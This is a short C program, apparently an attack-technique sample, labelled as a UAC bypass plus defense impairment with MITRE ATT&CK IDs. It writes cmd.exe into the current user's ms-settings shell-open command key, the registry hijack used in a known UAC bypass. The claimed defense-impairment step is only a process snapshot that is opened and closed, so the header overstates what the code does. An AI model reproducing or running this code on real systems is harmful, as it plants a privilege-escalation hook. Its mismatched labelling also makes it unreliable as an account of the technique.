/* UAC Bypass + Impair Defenses: T1548.002 + T1562.001 */
#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>
#include <string.h>

int main(void) {
    HKEY hKey = NULL;
    if (RegCreateKeyExA(HKEY_CURRENT_USER, "Software\\Classes\\ms-settings\\Shell\\Open\\command", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_SET_VALUE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
        RegSetValueExA(hKey, NULL, 0, REG_SZ, (const BYTE *)"cmd.exe", 8);
        RegCloseKey(hKey);
    }
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap != INVALID_HANDLE_VALUE)
        CloseHandle(snap);
    return 0;
}
